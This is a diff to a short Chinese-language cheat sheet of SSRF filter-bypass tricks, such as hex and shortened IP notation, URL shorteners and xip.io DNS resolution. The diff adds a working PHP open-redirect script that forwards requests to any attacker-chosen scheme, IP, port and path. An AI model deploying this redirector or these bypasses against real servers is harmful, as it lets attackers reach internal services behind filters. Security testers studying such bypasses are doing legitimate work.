@@ -3,9 +3,16 @@
 - 使用十六进制0xC0.0xA8.0.1等进制转换，
 - IP缩写10.0.0.1可以写成10.1（未验证）
 - 利用302跳转
-	> 附上自己写跳转脚本
-	```
+	> 附上简易跳转脚本
+```
 	
+<?php
+$ip = $_GET['ip'];
+$port = $_GET['port'];
+$scheme = $_GET['s'];
+$data = $_GET['data'];
+header("Location: $scheme://$ip:$port/$data");
+?>
 	```
 - url短网址，但是有一些短网址不支持使用ip生成，[tinyurl支持](https://tinyurl.com/)，
 - 使用http://xip.io,可以将192.168.0.1.xip.io解析到192.168.0.1，然后可以配合url短网址绕过
